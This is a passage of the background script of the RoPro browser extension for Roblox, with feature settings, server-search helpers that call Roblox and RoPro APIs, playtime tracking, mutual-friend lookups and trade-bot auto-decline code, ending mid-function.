//RoPro v1.5
//RoPro v2.0 revamp coming soon. RoPro v2.0 is a manifest v3 total rewrite of RoPro using React & Tailwind to make the extension faster, more reliable, and more maintainable.

function getStorage(key) {
	return new Promise(resolve => {
		chrome.storage.sync.get(key, function (obj) {
			resolve(obj[key])
		})
	})
}

function setStorage(key, value) {
	return new Promise(resolve => {
		chrome.storage.sync.set({[key]: value}, function(){
			resolve()
		})
	})
}

function getLocalStorage(key) {
	return new Promise(resolve => {
		chrome.storage.local.get(key, function (obj) {
			resolve(obj[key])
		})
	})
}

function setLocalStorage(key, value) {
	return new Promise(resolve => {
		chrome.storage.local.set({[key]: value}, function(){
			resolve()
		})
	})
}

var defaultSettings = {
	buyButton: true,
	comments: true,
	dealCalculations: "rap",
	dealNotifier: true,
	embeddedRolimonsItemLink: true,
	embeddedRolimonsUserLink: true,
	fastestServersSort: true,
	gameLikeRatioFilter: true,
	gameTwitter: true,
	genreFilters: true,
	groupDiscord: true,
	groupRank: true,
	groupTwitter: true,
	featuredToys: true,
	itemPageValueDemand: true,
	linkedDiscord: true,
	liveLikeDislikeFavoriteCounters: true,
	livePlayers: true,
	liveVisits: true,
	roproVoiceServers: true,
	premiumVoiceServers: true,
	moreGameFilters: true,
	additionalServerInfo: true,
	moreServerFilters: true,
	serverInviteLinks: true,
	serverFilters: true,
	mostRecentServer: true,
	randomServer: true,
	tradeAge: true,
	notificationThreshold: 30,
	itemInfoCard: true,
	ownerHistory: true,
	profileThemes: true,
	globalThemes: true,
	lastOnline: true,
	roproEggCollection: true,
	profileValue: true,
	projectedWarningItemPage: true,
	quickItemSearch: true,
	quickTradeResellers: true,
	hideSerials: true,
	quickUserSearch: true,
	randomGame: true,
	popularToday: true,
	reputation: true,
	reputationVote: true,
	sandbox: true,
	sandboxOutfits: true,
	serverSizeSort: true,
	singleSessionMode: false,
	tradeDemandRatingCalculator: true,
	tradeItemDemand: true,
	tradeItemValue: true,
	tradeNotifier: true,
	tradeOffersPage: true,
	tradeOffersSection: true,
	tradeOffersValueCalculator: true,
	tradePageProjectedWarning: true,
	tradePreviews: true,
	tradeProtection: true,
	tradeValueCalculator: true,
	moreTradePanel: true,
	valueThreshold: 0,
	hideTradeBots: true,
	autoDeclineTradeBots: true,
	hideDeclinedNotifications: true,
	hideOutboundNotifications: false,
	tradePanel: true,
	quickDecline: true,
	quickCancel: true,
	roproIcon: true,
	underOverRAP: true,
	winLossDisplay: true,
	mostPlayedGames: true,
	allExperiences: true,
	roproShuffle: true,
	experienceQuickSearch: true,
	experienceQuickPlay: true,
	avatarEditorChanges: true,
	playtimeTracking: true,
	activeServerCount: true,
	morePlaytimeSorts: true,
	roproBadge: true,
	mutualFriends: true,
	moreMutuals: true,
	animatedProfileThemes: true,
	cloudPlay: true,
	cloudPlayActive: false,
	hidePrivateServers: false,
	quickEquipItem: true,
	roproWishlist: true,
	themeColorAdjustments: true,
	tradeSearch: true,
	advancedTradeSearch: true
}

var disabledFeatures = "";

$.post("https://api.ropro.io/disabledFeatures.php", function(data) {
		disabledFeatures = data
})

async function initializeSettings() {
	return new Promise(resolve => {
		async function checkSettings() {
			initialSettings = await getStorage('rpSettings')
			if (typeof initialSettings === "undefined") {
				await setStorage("rpSettings", defaultSettings)
				resolve()
			} else {
				changed = false
				for (key in Object.keys(defaultSettings)) {
					settingKey = Object.keys(defaultSettings)[key]
					if (!(settingKey in initialSettings)) {
						initialSettings[settingKey] = defaultSettings[settingKey]
						changed = true
					}
				}
				if (changed) {
					console.log("SETTINGS UPDATED")
					await setStorage("rpSettings", initialSettings)
				}
			}
			userVerification = await getStorage('userVerification')
			if (typeof userVerification === "undefined") {
				await setStorage("userVerification", {})
			}
			$.get('https://api.ropro.io/cloudPlayMetadata.php?cache', async function(data) {
				enabled = data['enabled'] ? true : false
				initialSettings['cloudPlay'] = enabled
				initialSettings['cloudPlayHidden'] = !enabled
				await setStorage("rpSettings", initialSettings)
			})
		}
		checkSettings()
	})
}
initializeSettings()

async function binarySearchServers(gameID, playerCount, maxLoops = 20) {
	async function getServerIndexPage(gameID, index) {
		return new Promise(resolve2 => {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
					resolve2(data)
				})
			})
		})
	}
	return new Promise(resolve => {
		var numLoops = 0
		$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
			var bounds = [parseInt(data.bounds[0] / 100), parseInt(data.bounds[1] / 100)]
			var index = null
			while(bounds[0] <= bounds[1] && numLoops < maxLoops) {
				mid = parseInt((bounds[0] + bounds[1]) / 2)
				var servers = await getServerIndexPage(gameID, mid * 100)
				await roproSleep(500)
				var minPlaying = -1
				if (servers.data.length > 0) {
					if (servers.data[0].playerTokens.length > playerCount) {
						bounds[1] = mid - 1
					} else if (servers.data[servers.data.length - 1].playerTokens.length < playerCount) {
						bounds[0] = mid + 1
					} else {
						index = mid
						break
					}
				} else {
					bounds[0] = mid + 1
				}
				numLoops++
			}
			if (index == null) {
				index = bounds[1]
			}
			resolve(index * 100)
		})
	})
}

async function maxPlayerCount(gameID, count) {
	return new Promise(resolve => {
		async function doMaxPlayerCount(gameID, count, resolve) {
			var index = await binarySearchServers(gameID, count, 20)
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				var serverDict = {}
				var serverArray = []
				var numLoops = 0
				var done = false
				function getReversePage(cursor) {
					return new Promise(resolve2 => {
						$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
							if (data.hasOwnProperty('data')) {
								for (var i = 0; i < data.data.length; i++) {
									serverDict[data.data[i].id] = data.data[i]
								}
							}
							resolve2(data)
						})
					})
				}
				while (!done && Object.keys(serverDict).length <= 150 && numLoops < 10) {
					var servers = await getReversePage(cursor)
					await roproSleep(500)
					if (servers.hasOwnProperty('previousPageCursor') && servers.previousPageCursor != null) {
						cursor = servers.previousPageCursor
					} else {
						done = true
					}
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					if (serverDict[keys[i]].hasOwnProperty('playing') && serverDict[keys[i]].playing <= count) {
						serverArray.push(serverDict[keys[i]])
					}
				}
				serverArray.sort(function(a, b){return b.playing - a.playing})
				console.log(serverArray)
				resolve(serverArray)
			})
		}
		doMaxPlayerCount(gameID, count, resolve)
	})
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}

async function serverFilterReverseOrder(gameID) {
	return new Promise(resolve => {
		async function doReverseOrder(gameID, resolve) {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
				var cursor = data.cursor == null ? "" : data.cursor
				var serverDict = {}
				var serverArray = []
				var numLoops = 0
				var done = false
				function getReversePage(cursor) {
					return new Promise(resolve2 => {
						$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
							if (data.hasOwnProperty('data')) {
								for (var i = 0; i < data.data.length; i++) {
									serverDict[data.data[i].id] = data.data[i]
								}
							}
							resolve2(data)
						})
					})
				}
				while (!done && Object.keys(serverDict).length <= 150 && numLoops < 20) {
					var servers = await getReversePage(cursor)
					await roproSleep(500)
					if (servers.hasOwnProperty('nextPageCursor') && servers.nextPageCursor != null) {
						cursor = servers.nextPageCursor
					} else {
						done = true
					}
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					if (serverDict[keys[i]].hasOwnProperty('playing')) {
						serverArray.push(serverDict[keys[i]])
					}
				}
				serverArray.sort(function(a, b){return a.playing - b.playing})
				resolve(serverArray)
			})
		}
		doReverseOrder(gameID, resolve)
	})
}

async function serverFilterRandomShuffle(gameID, minServers = 150) {
	return new Promise(resolve => {
		async function doRandomShuffle(gameID, resolve) {
			$.get("https://api.ropro.io/getServerCursor.php?startIndex=0&placeId=" + gameID, async function(data) {
				var indexArray = []
				var serverDict = {}
				var serverArray = []
				var done = false
				var numLoops = 0
				for (var i = data.bounds[0]; i <= data.bounds[1]; i = i + 100) {
					indexArray.push(i)
				}
				function getIndex() {
					return new Promise(resolve2 => {
						if (indexArray.length > 0) {
							var i = Math.floor(Math.random() * indexArray.length)
							var index = indexArray[i]
							indexArray.splice(i, 1)
							$.get("https://api.ropro.io/getServerCursor.php?startIndex=" + index + "&placeId=" + gameID, function(data) {
								var cursor = data.cursor
								if (cursor == null) {
									cursor = ""
								}
								$.get("https://games.roblox.com/v1/games/" + gameID + "/servers/Public?cursor=" + cursor + "&sortOrder=Asc&limit=100", function(data) {
									if (data.hasOwnProperty('data')) {
										for (var i = 0; i < data.data.length; i++) {
											if (data.data[i].hasOwnProperty('playing') && data.data[i].playing < data.data[i].maxPlayers) {
												serverDict[data.data[i].id] = data.data[i]
											}
										}
									}
									resolve2()
								}).fail(function() {
									done = true
									resolve2()
								})
							})
						} else {
							done = true
							resolve2()
						}
					})
				}
				while (!done && Object.keys(serverDict).length <= minServers && numLoops < 20) {
					await getIndex()
					await roproSleep(500)
					numLoops++
				}
				keys = Object.keys(serverDict)
				for (var i = 0; i < keys.length; i++) {
					serverArray.push(serverDict[keys[i]])
				}
				resolve(serverArray)
			})
		}
		doRandomShuffle(gameID, resolve)
	})
}

async function fetchServerInfo(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://api.ropro.io/getServerInfo.php", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function fetchServerConnectionScore(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://api.ropro.io/getServerConnectionScore.php", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function fetchServerAge(placeID, servers) {
	return new Promise(resolve => {
		$.post({url:"https://api.ropro.io/getServerAge.php", data: {'placeID':placeID, 'servers': servers}}, 
			function(data) {
				resolve(data)
			}
		)
	})
}

async function serverFilterRegion(gameID, location) {
	return new Promise(resolve => {
		async function doServerFilterRegion(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkLocations(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerInfo(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					if (serverInfo[i].location == location && !(serverInfo[i].server in serverSet)) {
						serverList.push(serversDict[serverInfo[i].server])
						serverSet[serverInfo[i].server] = true
					}
				}
				console.log(serverList)
				resolve(serverList)	
			}
			checkLocations(serverArray)
		}
		doServerFilterRegion(gameID, resolve)
	})
}

async function serverFilterBestConnection(gameID) {
	return new Promise(resolve => {
		async function doServerFilterBestConnection(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkLocations(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerConnectionScore(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['score'] = serverInfo[i].score
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['score'] < b['score']) ? -1 : ((a['score'] > b['score']) ? 1 : 0));
				})
				resolve(serverList)
			}
			checkLocations(serverArray)
		}
		doServerFilterBestConnection(gameID, resolve)
	})
}

async function serverFilterNewestServers(gameID) {
	return new Promise(resolve => {
		async function doServerFilterNewestServers(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkAge(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerAge(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['age'] = serverInfo[i].age
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['age'] < b['age']) ? -1 : ((a['age'] > b['age']) ? 1 : 0));
				})
				resolve(serverList)
			}
			checkAge(serverArray)
		}
		doServerFilterNewestServers(gameID, resolve)
	})
}

async function serverFilterOldestServers(gameID) {
	return new Promise(resolve => {
		async function doServerFilterOldestServers(gameID, resolve) {
			var serverArray = await serverFilterRandomShuffle(gameID, 250)
			var serverList = []
			var serverSet = {}
			shuffleArray(serverArray)
			async function checkAge(serverArray) {
				var serversDict = {}
				for (var i = 0; i < serverArray.length; i++) {
					serversDict[serverArray[i].id] = serverArray[i]
				}
				serverInfo = await fetchServerAge(gameID, Object.keys(serversDict))
				for (var i = 0; i < serverInfo.length; i++) {
					serversDict[serverInfo[i].server]['age'] = serverInfo[i].age
					serverList.push(serversDict[serverInfo[i].server])
				}
				serverList = serverList.sort(function(a, b) {
					return ((a['age'] < b['age']) ? 1 : ((a['age'] > b['age']) ? -1 : 0));
				})
				resolve(serverList)
			}
			checkAge(serverArray)
		}
		doServerFilterOldestServers(gameID, resolve)
	})
}

async function roproSleep(ms) {
	return new Promise(resolve => {
		setTimeout(function() {
			resolve()
		}, ms)
	})
}

async function getServerPage(gameID, cursor) {
	return new Promise(resolve => {
		$.get('https://games.roblox.com/v1/games/' + gameID + '/servers/Public?limit=100&cursor=' + cursor, async function(data, error, response) {
			resolve(data)
		}).fail(function() {
			resolve({})
		})
	})
}

async function randomServer(gameID) {
	return new Promise(resolve => {
		$.get('https://games.roblox.com/v1/games/' + gameID + '/servers/Friend?limit=100', async function(data) {
			friendServers = []
			for (i = 0; i < data.data.length; i++) {
				friendServers.push(data.data[i]['id'])
			}
			var serverList = new Set()
			var done = false
			var numLoops = 0
			var cursor = ""
			while (!done && serverList.size < 150 && numLoops < 5) {
				var serverPage = await getServerPage(gameID, cursor)
				await roproSleep(500)
				if (serverPage.hasOwnProperty('data')) {
					for (var i = 0; i < serverPage.data.length; i++) {
						server = serverPage.data[i]
						if (!friendServers.includes(server.id) && server.playing < server.maxPlayers) {
							serverList.add(server)
						}
					}
				}
				if (serverPage.hasOwnProperty('nextPageCursor')) {
					cursor = serverPage.nextPageCursor
					if (cursor == null) {
						done = true
					}
				} else {
					done = true
				}
				numLoops++
			}
			if (!done && serverList.size == 0) { //No servers found via linear cursoring but end of server list not reached, try randomly selecting servers.
				console.log("No servers found via linear cursoring but end of server list not reached, lets try randomly selecting servers.")
				var servers = await serverFilterRandomShuffle(gameID, 50)
				for (var i = 0; i < servers.length; i++) {
					server = servers[i]
					if (!friendServers.includes(server.id) && server.playing < server.maxPlayers) {
						serverList.add(server)
					}
				}
			}
			serverList = Array.from(serverList)
			if (serverList.length > 0) {
				resolve(serverList[Math.floor(Math.random() * serverList.length)])
			} else {
				resolve(null)
			}
		})
	})
}

async function getTimePlayed() {
	playtimeTracking = await loadSettings("playtimeTracking")
	mostRecentServer = true
	if (playtimeTracking || mostRecentServer) {
		userID = await getStorage("rpUserID");
		if (playtimeTracking) {
			timePlayed = await getLocalStorage("timePlayed")
			if (typeof timePlayed == 'undefined') {
				timePlayed = {}
				setLocalStorage("timePlayed", timePlayed)
			}
		}
		if (mostRecentServer) {
			mostRecentServers = await getLocalStorage("mostRecentServers")
			if (typeof mostRecentServers == 'undefined') {
				mostRecentServers = {}
				setLocalStorage("mostRecentServers", mostRecentServers)
			}
		}
		$.ajax({
			url: "https://presence.roblox.com/v1/presence/users",
			type: "POST",
			data: {
				"userIds": [
				userID
				]
			},
			success: async function(data) {
				placeId = data.userPresences[0].placeId
				universeId = data.userPresences[0].universeId
				if (placeId != null && universeId != null && data.userPresences[0].userPresenceType != 3) {
					if (playtimeTracking) {
						if (universeId in timePlayed) {
							timePlayed[universeId] = [timePlayed[universeId][0] + 1, new Date().getTime(), true]
						} else {
							timePlayed[universeId] = [1, new Date().getTime(), true]
						}
						if (timePlayed[universeId][0] >= 30) {
							timePlayed[universeId] = [0, new Date().getTime(), true]
							verificationDict = await getStorage('userVerification')
							userID = await getStorage('rpUserID')
							roproVerificationToken = "none"
							if (typeof verificationDict != 'undefined') {
								if (verificationDict.hasOwnProperty(userID)) {
									roproVerificationToken = verificationDict[userID]
								}
							}
							$.ajax({
								url: "https://api.ropro.io/postTimePlayed.php?gameid=" + placeId + "&universeid=" + universeId,
								type: "POST",
								headers: {'ropro-verification': roproVerificationToken, 'ropro-id': userID}
							})
						}
						setLocalStorage("timePlayed", timePlayed)
					}
					if (mostRecentServer) {
						gameId = data.userPresences[0].gameId
						if (gameId != null) {
							mostRecentServers[universeId] = [placeId, gameId, userID, new Date().getTime()]
							setLocalStorage("mostRecentServers", mostRecentServers)
						}
					}
				}
			}
		})
	}
}

setInterval(getTimePlayed, 60000)

var cloudPlayTab = null

async function launchCloudPlayTab(placeID, serverID = null, accessCode = null) {
	if (cloudPlayTab == null) {
		chrome.tabs.create({
			url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
		}, function(tab) {
			cloudPlayTab = tab.id
		})
	} else {
		chrome.tabs.get(cloudPlayTab, function(tab) {
			if (!tab) {
				chrome.tabs.create({
					url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
				}, function(tab) {
					cloudPlayTab = tab.id
				})
			} else {
				chrome.tabs.update(tab.id, {
					active: true,
					url: `https://now.gg/play/roblox-corporation/5349/roblox?utm_source=extension&utm_medium=browser&utm_campaign=ropro&deep_link=robloxmobile%3A%2F%2FplaceID%3D${parseInt(placeID)}${serverID == null ? '' : '%26gameInstanceId%3D' + serverID}${accessCode == null ? '' : '%26accessCode%3D' + accessCode}`
				})
			}
		})
	}
}

function range(start, end) {
    var foo = [];
    for (var i = start; i <= end; i++) {
        foo.push(i);
    }
    return foo;
}

function stripTags(s) {
	if (typeof s == "undefined") {
		return s
	}
	return s.replace(/(<([^>]+)>)/gi, "").replace(/</g, "").replace(/>/g, "").replace(/'/g, "").replace(/"/g, "").replace(/`/g, "");
 }

async function mutualFriends(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			friendCache = await getLocalStorage("friendCache")
			console.log(friendCache)
			if (typeof friendCache == "undefined" || new Date().getTime() - friendCache["expiration"] > 300000) {
				$.get('https://friends.roblox.com/v1/users/' + myId + '/friends', function(myFriends){
					setLocalStorage("friendCache", {"friends": myFriends, "expiration": new Date().getTime()})
					$.get('https://friends.roblox.com/v1/users/' + userId + '/friends', async function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Friends:", mutuals)
						resolve(mutuals)
					})
				})
			} else {
				myFriends = friendCache["friends"]
				console.log("cached")
				console.log(friendCache)
					$.get('https://friends.roblox.com/v1/users/' + userId + '/friends', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Friends:", mutuals)
						resolve(mutuals)
					})
			}
		}
		doGet()
	})
}

async function mutualFollowing(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
				$.get('https://friends.roblox.com/v1/users/' + myId + '/followings?sortOrder=Desc&limit=100', function(myFriends){
					$.get('https://friends.roblox.com/v1/users/' + userId + '/followings?sortOrder=Desc&limit=100', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Following:", mutuals)
						resolve(mutuals)
					})
				})
		}
		doGet()
	})
}


async function mutualFollowers(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
				$.get('https://friends.roblox.com/v1/users/' + myId + '/followers?sortOrder=Desc&limit=100', function(myFriends){
					$.get('https://friends.roblox.com/v1/users/' + userId + '/followers?sortOrder=Desc&limit=100', function(theirFriends){
						friends = {}
						for (i = 0; i < myFriends.data.length; i++) {
							friend = myFriends.data[i]
							friends[friend.id] = friend
						}
						mutuals = []
						for (i = 0; i < theirFriends.data.length; i++) {
							friend = theirFriends.data[i]
							if (friend.id in friends) {
								mutuals.push({"name": stripTags(friend.name), "link": "/users/" + parseInt(friend.id) + "/profile", "icon": "https://www.roblox.com/headshot-thumbnail/image?userId=" + parseInt(friend.id) + "&width=420&height=420&format=png", "additional": friend.isOnline ? "Online" : "Offline"})
							}
						}
						console.log("Mutual Followers:", mutuals)
						resolve(mutuals)
					})
				})
		}
		doGet()
	})
}

async function mutualFavorites(userId, assetType) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			$.get('https://www.roblox.com/users/favorites/list-json?assetTypeId=' + assetType + '&itemsPerPage=10000&pageNumber=1&userId=' + myId, function(myFavorites){
				$.get('https://www.roblox.com/users/favorites/list-json?assetTypeId=' + assetType + '&itemsPerPage=10000&pageNumber=1&userId=' + userId, function(theirFavorites){
					favorites = {}
					for (i = 0; i < myFavorites.Data.Items.length; i++) {
						favorite = myFavorites.Data.Items[i]
						favorites[favorite.Item.AssetId] = favorite
					}
					mutuals = []
					for (i = 0; i < theirFavorites.Data.Items.length; i++) {
						favorite = theirFavorites.Data.Items[i]
						if (favorite.Item.AssetId in favorites) {
							mutuals.push({"name": stripTags(favorite.Item.Name), "link": stripTags(favorite.Item.AbsoluteUrl), "icon": favorite.Thumbnail.Url, "additional": "By " + stripTags(favorite.Creator.Name)})
						}
					}
					console.log("Mutual Favorites:", mutuals)
					resolve(mutuals)
				})
			})
		}
		doGet()
	})
}

async function mutualGroups(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			d = {}
			$.get('https://groups.roblox.com/v1/users/' + myId + '/groups/roles', function(groups) {
				for (i = 0; i < groups.data.length; i++) {
					d[groups.data[i].group.id] = true
				}
				mutualsJSON = []
				mutuals = []
				$.get('https://groups.roblox.com/v1/users/' + userId + '/groups/roles', function(groups) {
					for (i = 0; i < groups.data.length; i++) {
						if (groups.data[i].group.id in d) {
							mutualsJSON.push({"groupId": groups.data[i].group.id})
							mutuals.push({"id": groups.data[i].group.id, "name": stripTags(groups.data[i].group.name), "link": stripTags("https://www.roblox.com/groups/" + groups.data[i].group.id + "/group"), "icon": "https://t0.rbxcdn.com/75c8a07ec89b142d63d9b8d91be23b26", "additional": groups.data[i].group.memberCount + " Members"})
						}
					}
					$.get('https://www.roblox.com/group-thumbnails?params=' + JSON.stringify(mutualsJSON), function(data) { 
						for (i = 0; i < data.length; i++) {
							d[data[i].id] = data[i].thumbnailUrl
						}
						for (i = 0; i < mutuals.length; i++) {
							mutuals[i].icon = d[mutuals[i].id]
						}
						console.log("Mutual Groups:", mutuals)
						resolve(mutuals)
					})
				})
			})
		}
		doGet()
	})
}

async function mutualItems(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			myItems = await loadItems(myId, "Hat,Face,Gear,Package,HairAccessory,FaceAccessory,NeckAccessory,ShoulderAccessory,FrontAccessory,BackAccessory,WaistAccessory,Shirt,Pants")
			try {
				theirItems = await loadItems(userId, "Hat,Face,Gear,Package,HairAccessory,FaceAccessory,NeckAccessory,ShoulderAccessory,FrontAccessory,BackAccessory,WaistAccessory,Shirt,Pants")
			} catch(err) {
				resolve([{"error": true}])
			}
			mutuals = []
			for (let item in theirItems) {
				if (item in myItems) {
					mutuals.push({"name": stripTags(myItems[item].name), "link": stripTags("https://www.roblox.com/catalog/" + myItems[item].assetId), "icon": "https://api.ropro.io/getAssetThumbnail.php?id=" + myItems[item].assetId, "additional": ""})
				}
			}
			console.log("Mutual Items:", mutuals)
			resolve(mutuals)
		}
		doGet()
	})
}

async function mutualLimiteds(userId) {
	return new Promise(resolve => {
		async function doGet() {
			myId = await getStorage("rpUserID")
			myLimiteds = await loadInventory(myId)
			try {
				theirLimiteds = await loadInventory(userId)
			} catch(err) {
				resolve([{"error": true}])
			}
			mutuals = []
			for (let item in theirLimiteds) {
				if (item in myLimiteds) {
					mutuals.push({"name": stripTags(myLimiteds[item].name), "link": stripTags("https://www.roblox.com/catalog/" + myLimiteds[item].assetId), "icon": "https://api.ropro.io/getAssetThumbnail.php?id=" + myLimiteds[item].assetId, "additional": "Quantity: " + parseInt(theirLimiteds[item].quantity)})
				}
			}
			console.log("Mutual Limiteds:", mutuals)
			resolve(mutuals)
		}
		doGet()
	})
}


async function getPage(userID, assetType, cursor) {
	return new Promise(resolve => {
		function getPage(resolve, userID, cursor, assetType) {
			$.get(`https://inventory.roblox.com/v1/users/${userID}/assets/collectibles?cursor=${cursor}&limit=50&sortOrder=Desc${assetType == null ? '' : '&assetType=' + assetType}`, function(data) {
				resolve(data)
			}).fail(function(r, e, s){
				if (r.status == 429) {
					setTimeout(function(){
						getPage(resolve, userID, cursor, assetType)
					}, 21000)
				} else {
					resolve({"previousPageCursor":null,"nextPageCursor":null,"data":[]})
				}
			})
		}
		getPage(resolve, userID, cursor, assetType)
	})
}

async function getInventoryPage(userID, assetTypes, cursor) {
	return new Promise(resolve => {
		$.get('https://inventory.roblox.com/v2/users/' + userID + '/inventory?assetTypes=' + assetTypes + '&limit=100&sortOrder=Desc&cursor=' + cursor, function(data) {
			resolve(data)
		}).fail(function(){
			resolve({})
		})
	})
}

async function declineBots() { //Code to decline all suspected trade botters
	return new Promise(resolve => {
		var tempCursor = ""
		var botTrades = []
		var totalLoops = 0
		var totalDeclined = 0
		async function doDecline() {
			trades = await fetchTradesCursor("inbound", 100, tempCursor)
			tempCursor = trades.nextPageCursor
			tradeIds = []
			userIds = []
			for (i = 0; i < trades.data.length; i++) {
				tradeIds.push([trades.data[i].user.id, trades.data[i].id])
				userIds.push(trades.data[i].user.id)
			}
			if (userIds.length > 0) {
				flags = await fetchFlagsBatch(userIds)
				flags = JSON.parse(flags)
				for (i = 0; i < tradeIds.length; i++) {
					try{
						if (flags.includes(tradeIds[i][0].toString())) {
							botTrades.push(tradeIds[i][1])
						}
					} catch (e) {
						console.log(e)
					}
				}
			}
			if (totalLoops < 20 && tempCursor != null) {
				setTimeout(function(){
					doDecline()
					totalLoops += 1
				}, 100)
			} else {
				if (botTrades.length > 0) {
					await loadToken()
					token = await getStorage("token")
					for (i = 0; i < botTrades.length; i++) {
						console.log(i, botTrades.length)
						try {
							if (totalDeclined < 300) {
								await cancelTrade(botTrades[i], token)
								totalDeclined = totalDeclined + 1
							} else {
								resolve(totalDeclined)
							}
						} catch(e) {
							resolve(totalDeclined)
						}
					}
				}
				console.log("Declined " + botTrades.length + " trades!")
				resolve(botTrades.length)
			}
		}
		doDecline()
	})
}

async function fetchFlagsBatch(userIds) {
	return new Promise(resolve => {
		$.post("https://api.ropro.io/fetchFlags.php?ids=" + userIds.join(","), function(data){ 
			resolve(data)
		})
	})
}

function createNotification(notificationId, options) {
	return new Promise(resolve => {
		chrome.notifications.create(notificationId, options, function() {
			resolve()
		})
	})	
}

async function loadItems(userID, assetTypes) {
	myInventory = {}
	async function handleAsset(cursor) {
		response = await getInventoryPage(userID, assetTypes, cursor)
		for (j = 0; j < response.data.length; j++) {
			item = response.data[j]
			if (item['assetId'] in myInventory) {
				myInventory[item['assetId']]['quantity']++
			} else {
				myInventory[item['assetId']] = item
				myInventory[item['assetId']]['quantity'] = 1
			}
		}
		if (response.nextPageCursor != null) {
			await handleAsset(response.nextPageCursor)
		}
	}
	await handleAsset("")
	total = 0
	for (item in myInventory) {
	  total += myInventory[item]['quantity']
	}
